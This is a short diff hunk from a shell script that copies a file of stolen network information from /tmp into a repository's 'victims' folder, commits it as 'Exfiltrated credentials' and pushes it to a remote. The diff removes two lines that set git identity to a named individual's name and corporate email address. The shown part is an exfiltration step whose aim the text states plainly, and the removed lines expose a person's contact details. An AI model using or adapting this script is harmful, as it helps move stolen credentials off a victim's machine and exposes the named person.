@@ -33,8 +33,6 @@ cd repo-copy/victims
 
 # Add and push the stolen data
 mv /tmp/netinfo.txt .
-git config user.name "Yuval Geva"
-git config user.email "yuval.g@next-insurance.com"
 git add netinfo.txt
 git commit -m "Exfiltrated credentials"
 git push
